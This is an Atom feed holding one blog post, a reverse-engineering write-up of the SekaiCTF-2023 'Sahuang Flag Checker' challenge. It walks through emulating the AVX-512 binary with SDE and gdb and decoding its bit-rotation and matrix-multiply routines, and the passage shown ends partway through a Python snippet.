<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Photon’s Blog</title>
  
  
  <link href="http://phot0n.com/atom.xml" rel="self"/>
  
  <link href="http://phot0n.com/"/>
  <updated>2023-08-29T17:02:54.096Z</updated>
  <id>http://phot0n.com/</id>
  
  <author>
    <name>Photon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WriteUps for some problems in SekaiCTF-2023</title>
    <link href="http://phot0n.com/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/"/>
    <id>http://phot0n.com/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/</id>
    <published>2023-08-29T03:54:14.000Z</published>
    <updated>2023-08-29T17:02:54.096Z</updated>
    
    <content type="html"><![CDATA[<p>last weekend , I take part in the SekaiCTF-2023 and solve some easy challenges.On the last day night, I spend most of time on the challenge called <code>Sahuang Flag Checker</code>.I get the main algorithms by reversing,but for some reason I overthink the problem and didn’t realize that It’s just a simple problem :(</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Sahuang-Flag-Checker"><a href="#Sahuang-Flag-Checker" class="headerlink" title="Sahuang Flag Checker"></a>Sahuang Flag Checker</h2><h3 id="Emulate"><a href="#Emulate" class="headerlink" title="Emulate"></a>Emulate</h3><p>To run this file,your cpu need to support AVX-512.Or you will get some info like <code>illegal instruction</code> .I try 3 methods to run it. First I try to use <code>unicorn</code> to emulate it , but It seems it don’t support AVX-512 too.(Although I find the info on the github issue page of unicorn,ones say that it support AVX-512.but , any way , I can’t run it.If some one know how to use it , please tell me)</p><p><img src="https://s2.loli.net/2023/08/29/pUJDSlNuYzgkOx9.png" alt="image-20230829174051968"></p><p>later I try to use <code>QEMU</code> to run this binary , but I can’t find some guide to tell me how to support AVX-512 on QEMU . While I  find the same question on <code>stackoverflow</code> ,and says that the tools called <code>SDE</code> may help. So I download this tools and find I can’t run it. I get the error info like <code>SDE ERROR: Could not find base path for</code>.Change the environment variables didn’t help. I search a lot but can solve it.Yep , I didnt notice the file called <code>sde64</code> (f**k ),and It can run.When I can run the binary,I only got 3 hours left. :(</p><p>You can launch two terminal, one run this command</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sde-external-9.24.0-2023-07-13-lin/sde64 -icl -debug --  ./sahuang</span><br></pre></td></tr></table></figure><p>it will tell you the post (info like</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Start GDB, then issue this command at the (gdb) prompt:</span><br><span class="line">  target remote :60633</span><br></pre></td></tr></table></figure><p> )</p><p>and one run gdb-multiarch to connect.</p><p>I don’t know why,My pwndbg and gef failed to work.So I can only use the primary gdb to debug it. It’s painful</p><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>It is clear that in this part,the file sacnf the flag string and pad it to 16-byte.It is stored in v31.</p><p> <img src="https://s2.loli.net/2023/08/29/wKqYzAco8kI7eS9.png" alt="image-20230829175502662"></p><p>And ,in this part, It handle the flag string 16 bytes by 16 bytes (My English is pool, I want to express that it handle the first 16 bytes and the next 16bytes, and so on)</p><p>On each cycle, firstly the flag string to be handled is passed to a function called <code>rc</code> and stored in <code>v28</code>.</p><p>And <code>v28</code> is passed to <code>matmult_SSE4</code> (It may relative to matrix mult judged by its function name.I debug it in case the author change something in the matrix mult funciton.) and the result is stored in v29</p><p>Later,  after two <code>mul</code> and one <code>sub</code> and one <code>add</code> ,the flag string is changed to something like ciphertext.</p><p>We need to recover the flag by the ciphertext</p><p><img src="https://s2.loli.net/2023/08/29/trSbF5G3gcuYmWQ.png" alt="image-20230829175714938"></p><h4 id="rc"><a href="#rc" class="headerlink" title="rc"></a>rc</h4><p>first ,Let ‘ s analysis the function called <code>rc</code> .I analysis it staticly.Actually,it has a lot of junk code.And in function <code>mul</code> and function <code>sub</code> and function <code>add</code>,there are a lot of junk code of the same style like this.</p><p>It receive two parameter, one <code>char</code> and one <code>int</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">rc</span><span class="params">(<span class="keyword">char</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v41; <span class="comment">// [rsp+8h] [rbp-130h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [rsp+9h] [rbp-12Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+Ah] [rbp-12Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v44; <span class="comment">// [rsp+Bh] [rbp-12Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [rsp+10h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">int</span> v46; <span class="comment">// [rsp+14h] [rbp-124h]</span></span><br><span class="line"></span><br><span class="line">  v44 = a1;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vpbroadcastb xmm0, [rbp+var_12D]</span><br><span class="line">    vmovdqa [rbp+var_120], xmm0</span><br><span class="line">  &#125;</span><br><span class="line">  v43 = <span class="number">0xF0</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vpbroadcastb xmm0, [rbp+var_12E]</span><br><span class="line">    vmovdqa xmm1, xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_120]</span><br><span class="line">    vmovdqa [rbp+var_20], xmm0</span><br><span class="line">    vmovdqa [rbp+var_10], xmm1</span><br><span class="line">    vmovdqa xmm1, [rbp+var_20]</span><br><span class="line">    vmovdqa xmm0, [rbp+var_10]</span><br><span class="line">    vpand   xmm0, xmm1, xmm0</span><br><span class="line">    vmovdqa [rbp+var_F0], xmm0</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>We notice that the <code>v44</code>(the int parameter we pass in) is stored in <code>[rbp-12Dh]</code> and it store the parameter <code>a1</code>,  In the first asm block, It is passed to <code>xmm0</code> and then stored in <code>[rbp-120h]</code> . In the second asm block,the content in <code>[rbp+var_12E]</code>  (Actually the <code>v43</code>)is passed to <code>xmm0</code> and then passed to <code>xmm1</code>, and the content in <code>[rbp+var_120h]</code>(which is the <code>v44</code>,or the <code>a1</code> we pass) . And we get <code>xmm1 &amp; xmm2</code> by the code <code>vpand   xmm0, xmm1, xmm0</code> . The result is stored in <code>[rbp+var_F0]</code>. So this part we get <code>a1&amp;f0</code> (the highest 4 bit of a1)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v42; <span class="comment">// [rsp+9h] [rbp-12Fh]  </span></span><br><span class="line">v42 = <span class="number">0xF</span>;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vpbroadcastb xmm0, [rbp+var_12F]</span><br><span class="line">    vmovdqa xmm1, xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_120]</span><br><span class="line">    vmovdqa [rbp+var_40], xmm0</span><br><span class="line">    vmovdqa [rbp+var_30], xmm1</span><br><span class="line">    vmovdqa xmm1, [rbp+var_40]</span><br><span class="line">    vmovdqa xmm0, [rbp+var_30]</span><br><span class="line">    vpand   xmm0, xmm1, xmm0</span><br><span class="line">    vmovdqa [rbp+var_E0], xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_E0]</span><br><span class="line">    vmovdqa [rbp+var_50], xmm0</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Similarly ,we get the <code>a1&amp;0x0f</code> (the lowest 4 bit of a1)and store it in<code>[rbp+var_50]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span> v46; <span class="comment">// [rsp+14h] [rbp-124h]  </span></span><br><span class="line">v46 = <span class="number">4</span> - a2;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vmovdqa xmm0, [rbp+var_50]</span><br><span class="line">    vmovd   xmm1, [rbp+var_124]</span><br><span class="line">    vpsrld  xmm0, xmm0, xmm1</span><br><span class="line">    vmovdqa xmm2, xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_E0]</span><br><span class="line">    vmovdqa [rbp+var_60], xmm0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>this part, <code>xmm0</code> get the content of <code>[rbp+var_50]</code>(which is <code>a1&amp;0x0f</code> ) and <code>xmm1</code> get the content of <code>[rbp+var_124]</code>(which is <code>v46</code>. It is set to <code>4- a2</code>) .By the code  <code>vpsrld  xmm0, xmm0, xmm1</code> ,we get <code>(a1&amp;0f)&gt;&gt;(4-a2)</code>)and store it in <code>[rbp+var_60]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> v45; <span class="comment">// [rsp+10h] [rbp-128h]</span></span><br><span class="line">v45 = a2;</span><br><span class="line"> __asm</span><br><span class="line"> &#123;</span><br><span class="line">   vmovdqa xmm0, [rbp+var_60]</span><br><span class="line">   vmovd   xmm1, [rbp+var_128]</span><br><span class="line">   vpslld  xmm0, xmm0, xmm1</span><br><span class="line">   vmovdqa [rbp+var_80], xmm0</span><br><span class="line">   vmovdqa [rbp+var_70], xmm2</span><br><span class="line">   vmovdqa xmm1, [rbp+var_80]</span><br><span class="line">   vmovdqa xmm0, [rbp+var_70]</span><br><span class="line">   vpor    xmm0, xmm1, xmm0</span><br><span class="line">   vmovdqa [rbp+var_C0], xmm0</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>in this part ,like we just analysis ,It first get <code>(((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2</code> (By code <code>vpslld  xmm0, xmm0, xmm1</code> ,<code>xmm0</code> is <code>(a1&amp;0f)&gt;&gt;(4-a2)</code> ,<code>xmm1</code> is <code>v45</code>,which is set to a2) and store it in <code>[rbp+var_80]</code></p><p>By the code <code>vpor    xmm0, xmm1, xmm0</code>,we get  <code>((((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2) | (a1&amp;0f)&gt;&gt;(4-a2)</code> (<code>xmm1</code> is from the result of <code>vpslld</code> we just get, and <code>xmm0</code> ,which is from <code>xmm2</code>  -&gt;from <code>vpsrld  xmm0, xmm0, xmm1</code>  -&gt;<code>(a1&amp;0f)&gt;&gt;(4-a2)</code>)and store it in <code>[rbp+var_C0]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">char v41; &#x2F;&#x2F; [rsp+8h] [rbp-130h]</span><br><span class="line">v41 &#x3D; 0xF;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  vpbroadcastb xmm0, [rbp+var_130]</span><br><span class="line">  vmovdqa xmm1, xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_C0]</span><br><span class="line">  vmovdqa [rbp+var_100], xmm0</span><br><span class="line">  vmovdqa [rbp+var_110], xmm1</span><br><span class="line">  vmovdqa xmm1, [rbp+var_100]</span><br><span class="line">  vmovdqa xmm0, [rbp+var_110]</span><br><span class="line">  vpand   xmm0, xmm1, xmm0</span><br><span class="line">  vmovdqa xmm1, xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_F0]</span><br><span class="line">  vmovdqa [rbp+var_B0], xmm0</span><br><span class="line">  vmovdqa [rbp+var_D0], xmm1</span><br><span class="line">  vmovdqa xmm0, [rbp+var_B0]</span><br><span class="line">  vmovdqa xmm1, [rbp+var_D0]</span><br><span class="line">  vpor    xmm0, xmm1, xmm0</span><br><span class="line">  vmovdqa [rbp+var_A0], xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_A0]</span><br><span class="line">  vmovdqa [rbp+var_90], xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_90]</span><br><span class="line">  vmovd   eax, xmm0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>just the same way ,we get <code>(((((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2) | (a1&amp;0f)&gt;&gt;(4-a2)) &amp;0xf</code> and store it in <code>[rbp+var_D0]</code>,by <code>vpor    xmm0, xmm1, xmm0</code> ,we get <code>((((((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2) | (a1&amp;0f)&gt;&gt;a2) &amp;0xf)| (x&amp;0xf0)</code></p><p>Actually, if we draw to help us understand ,we could find that it is just a simple switch of bit</p><p>if we set a2 to be 3,it may like:a1  -&gt;  [7|6|5|4|3|2|1|0] ,the lowest 4 bit -&gt;[3|2|1|0] ,part 1 we get [3|2|1|0] &gt;&gt;(4-3)&lt;<3 ,which is [3|2|1|0|0|0], part 2 we get  [3|2|1|0]>&gt;(4-1) ,which is [3|2|1] ,and we and them and get [3|2|1|3|2|1] ,and we and 0xf get [1|3|2|1]. last we  or the x&amp;0xf0, finally get [7|6|5|4|1|3|2|1] .It’s just swtich the a2 highest bit of a2’s lowest 4 bit and (4-a2) lowest bit of a2 ‘s  lowest 4 bit</p><p>obviously, it’s reversible</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">1</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">3</span>))&amp;<span class="number">15</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev_rc</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">3</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">1</span>))&amp;<span class="number">15</span>))</span><br></pre></td></tr></table></figure><h4 id="matmult-SSE4"><a href="#matmult-SSE4" class="headerlink" title="matmult_SSE4"></a>matmult_SSE4</h4><p>Next we analysis the function called <code>matmult_SSE4</code> . We will use gdb to debug it and guess something (You can just read the assembly code like above analysis,But it’s not fun)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">matmult_SSE4</span><span class="params">(__int64 ans, __int64 matrix_1, __int64 matrix_2, __m128 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    lincomb_SSE(((__int64)i &lt;&lt; <span class="number">6</span>) + matrix_1, matrix_2, a3);</span><br><span class="line">    __asm &#123; vmovapd zmmword ptr [rsp+<span class="number">80</span>h+var_40], zmm0 &#125;</span><br><span class="line">    result = ans + ((__int64)i &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">80</span>h+var_40]</span><br><span class="line">      vmovapd zmmword ptr [rax], zmm0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>you may think it ‘s a function to mult two matrix subconsciously.But if you notice the function called <code>lincomb_SSE</code>,you may think the <code>matmult_SSE4</code> function is used to mult matrix and vector.After all, the second parameter (which is matrix_2) of  <code>lincomb_SSE</code> don’t change.Apparently, there should be a matrix and a columns vector. And each time the cow of matrix lincomb with the columns vector.You may get the info that the size of  matrix is 32*16(In <code>lincomb_SSE</code> there are 16 times add,and in <code>matmult_SSE4</code>, there are 32 times add.It was natural to think the matrix is 32*16)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">lincomb_SSE</span><span class="params">(__int64 A, __int64 a2, __m128 _XMM0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1DCh]</span></span><br><span class="line"></span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vxorpd  xmm0, xmm0, xmm0</span><br><span class="line">    vmovsd  [rsp+<span class="number">188</span>h+var_1D8], xmm0</span><br><span class="line">    vbroadcastsd zmm0, [rsp+<span class="number">188</span>h+var_1D8]</span><br><span class="line">    vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_1C0], zmm0</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _RAX = a2 + ((__int64)i &lt;&lt; <span class="number">7</span>);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      vmovsd  xmm0, qword ptr [rax]</span><br><span class="line">      vmovsd  [rsp+<span class="number">188</span>h+var_1C8], xmm0</span><br><span class="line">      vbroadcastsd zmm0, [rsp+<span class="number">188</span>h+var_1C8]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_140], zmm0</span><br><span class="line">    &#125;                                           <span class="comment">// matrix2的操作</span></span><br><span class="line">    _RDX = A;</span><br><span class="line">    result = i;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      vmovsd  xmm0, qword ptr [rdx+rax*<span class="number">8</span>]       <span class="comment">// ans</span></span><br><span class="line">      vmovsd  [rsp+<span class="number">188</span>h+var_1D0], xmm0</span><br><span class="line">      vbroadcastsd zmm0, [rsp+<span class="number">188</span>h+var_1D0]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_80], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_140]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_40], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_80]</span><br><span class="line">      vmulpd  zmm0, zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_40]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_C0], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_1C0]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_100], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_C0]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_180], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_180]</span><br><span class="line">      vaddpd  zmm0, zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_100]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_1C0], zmm0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_1C0] &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>But,really?</p><p>Let’s be out of the matmult function and observe the main function,you can see that a paramter called <code>A</code> in<code>.data</code> is passed to the matmult function .It occupies <code>2048</code> bytes.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matmult_SSE4((__int64)v29, (__int64)A, (__int64)v28, _XMM0);</span><br></pre></td></tr></table></figure><p>By reading the assembly  code you can know that the result is stored in <code>v29</code>(or you can guess it.<code>A</code> is the matrix to be mul, and <code>v28</code> store the flag strings processed by <code>rc</code>.So the result can only stored in <code>v29</code> )</p><p>And Let ‘s  analysis the <code>lincomb_SSE</code> function and see which data is used</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000017F7 mov     rdx, [rsp+188h+var_1F0]</span><br><span class="line">.text:00000000000017FC mov     eax, [rsp+188h+var_1DC]</span><br><span class="line">.text:0000000000001800 cdqe</span><br><span class="line">.text:0000000000001802 shl     rax, 7</span><br><span class="line">.text:0000000000001806 add     rax, rdx</span><br><span class="line">.text:0000000000001809 vmovsd  xmm0, qword ptr [rax] &#x2F;&#x2F;!</span><br><span class="line">.text:000000000000180D vmovsd  [rsp+188h+var_1C8], xmm0</span><br><span class="line">.text:0000000000001813 vbroadcastsd zmm0, [rsp+188h+var_1C8]</span><br><span class="line">.text:000000000000181B vmovapd zmmword ptr [rsp+188h+var_140], zmm0</span><br><span class="line">.text:0000000000001826 mov     rdx, [rsp+188h+var_1E8]</span><br><span class="line">.text:000000000000182B mov     eax, [rsp+188h+var_1DC]</span><br><span class="line">.text:000000000000182F cdqe</span><br><span class="line">.text:0000000000001831 vmovsd  xmm0, qword ptr [rdx+rax*8]</span><br><span class="line">.text:0000000000001836 vmovsd  [rsp+188h+var_1D0], xmm0</span><br><span class="line">.text:000000000000183C vbroadcastsd zmm0, [rsp+188h+var_1D0]</span><br><span class="line">.text:0000000000001844 vmovapd zmmword ptr [rsp+188h+var_80], zmm0</span><br><span class="line">.text:000000000000184F vmovapd zmm0, zmmword ptr [rsp+188h+var_140]</span><br><span class="line">.text:000000000000185A vmovapd zmmword ptr [rsp+188h+var_40], zmm0</span><br><span class="line">.text:0000000000001865 vmovapd zmm0, zmmword ptr [rsp+188h+var_80]</span><br><span class="line">.text:0000000000001870 vmulpd  zmm0, zmm0, zmmword ptr [rsp+188h+var_40]</span><br><span class="line">.text:000000000000187B vmovapd zmmword ptr [rsp+188h+var_C0], zmm0</span><br><span class="line">.text:0000000000001886 vmovapd zmm0, zmmword ptr [rsp+188h+var_1C0]</span><br><span class="line">.text:0000000000001891 vmovapd zmmword ptr [rsp+188h+var_100], zmm0</span><br><span class="line">.text:000000000000189C vmovapd zmm0, zmmword ptr [rsp+188h+var_C0]</span><br><span class="line">.text:00000000000018A7 vmovapd zmmword ptr [rsp+188h+var_180], zmm0</span><br><span class="line">.text:00000000000018B2 vmovapd zmm0, zmmword ptr [rsp+188h+var_180]</span><br><span class="line">.text:00000000000018BD vaddpd  zmm0, zmm0, zmmword ptr [rsp+188h+var_100]</span><br><span class="line">.text:00000000000018C8 vmovapd zmmword ptr [rsp+188h+var_1C0], zmm0</span><br><span class="line">.text:00000000000018D3 inc     [rsp+188h+var_1DC]</span><br></pre></td></tr></table></figure><p>Obviously, the element of the vector is obtain at  <code>0000000000001809</code> and stored in <code>[rsp+188h+var_140]</code>  ,the element of matrix is obtain at <code>0000000000001831</code> .the code at <code>0000000000001870</code> mul them(there is some code store and obtain,just trace the regs and memory and you can get what the operator is)</p><p>And ,the code at <code>00000000000018BD</code> to accumulate the sum.</p><p>So,We can set break point at  <code>0x0000000000001809</code> ,<code>0000000000001831</code> and  <code>00000000000018BD</code> to obverse.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p &amp;main-0x1100</span><br><span class="line"><span class="variable">$97</span> = (&lt;text variable, no debug info&gt; *) 0x564bb9367000</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$base</span>=0x564bb9367000</span><br><span class="line">(gdb) b *(<span class="variable">$base</span>+0x0000000000001809)</span><br><span class="line">Breakpoint 20 at 0x564bb9368809</span><br><span class="line">(gdb) b *(<span class="variable">$base</span>+0x0000000000001831)</span><br><span class="line">Breakpoint 21 at 0x564bb9368831</span><br><span class="line">(gdb) b *(<span class="variable">$base</span>+0x00000000000018bd)</span><br><span class="line">Breakpoint 22 at 0x564bb93688bd</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>and send flag  “1234” ,which is pad to “1234”+”X”*(16-4).After rc, it is traslate to something below</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">1</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">3</span>))&amp;<span class="number">15</span>))</span><br><span class="line">m = [<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">52</span>]+[<span 